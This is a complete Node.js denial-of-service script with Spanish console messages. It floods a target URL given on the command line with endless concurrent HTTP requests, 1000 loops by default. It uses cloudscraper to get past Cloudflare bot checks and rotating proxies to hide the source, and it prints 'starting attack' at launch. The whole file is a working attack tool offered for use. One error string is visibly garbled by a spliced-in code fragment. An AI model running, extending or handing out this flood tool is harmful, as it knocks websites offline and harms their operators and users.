'use strict';
var HttpsProxyAgent = require('https-proxy-agent');
const cloudscraper = require('cloudscraper');
const args = require('minimist')(process.argv.slice(2));
const fs = require('fs');

const site = args['attack'];
const threads = args['threads'] || 1000;
const proxy = args['proxy'] == "true";
const updateproxy = args['updateproxy'] == "true";
const checkproxy = true;
let globalProxies = [];
let useProxy = false;

if (typeof site === 'undefined') {
  console.log('Ingresa un url');
  return;
}

if (isNaN(threads)) {
  console.log('Ingresa un numero para los thr  infiniteThread();eads');
  return;
}

function getRandomInt(max) {
  return Math.floor(Math.random() * Math.floor(max));
}

function createThread() {
  return new Promise((resolve, reject) => {
    try {

      let options = { uri: site };

      if (useProxy) {
        options.agent = new HttpsProxyAgent(globalProxies[getRandomInt(globalProxies.length)]);
      }

      cloudscraper.get(options, function (error, response, body) {
        if (error) {
          resolve('Error');
        } else {
          resolve('Success');
        }
      });
    } catch (e) {
      resolve('Error')
    }
  });
}

async function infiniteThread() {
  while (true) {
    try {
      await createThread();
    } catch (e) {
    }
  }
}

async function loadProxies() {
  console.log("testing proxies...");
  const proxiesText = fs.readFileSync('proxy.txt', 'utf8');
  const proxies = proxiesText != null && proxiesText.length > 0 ? proxiesText.split('\n') : null;

  if (proxies == null || proxies.length == 0)
    return [];

  let validProxies = [];
  for (let index = 0; index < proxies.length; index++) {
    const proxy = 'http://' + proxies[index];
    validProxies.push(proxy);
  }

  console.log(`${validProxies.length} valid proxies`);
  return validProxies;
}

async function downloadProxy() {
  if (!updateproxy)
    return "";

  var spawn = require("child_process").spawn;
  var command = "./HiberProxy.py";
  var checkparameter = "n";

  if (checkproxy) {
    var checkparameter = "y";
  }
  else {
    var checkparameter = "n";
  }

  return await new Promise((resolve, reject) => {
    var process = spawn("python3", [command, "--checkproxy", checkparameter]);
    console.log("Actualizando proxys... espera");

    process.on('close', function (code) {
      resolve(code);
    });
    process.stdout.on('data', function (data) {
      console.log(data.toString());
    });
    process.stderr.on('data', (data) => {
      console.error(data.toString());
    });
  });
}

async function start() {

  try {
    await downloadProxy();
  } catch (e) { }

  if (proxy) {
    const validProxies = await loadProxies();
    if (validProxies.length > 0) {
      useProxy = true;
      globalProxies = validProxies;
    }
  }

  console.log("starting attack => " + site);
  for (let index = 0; index < threads; index++) {
    infiniteThread();
  }
}

start();
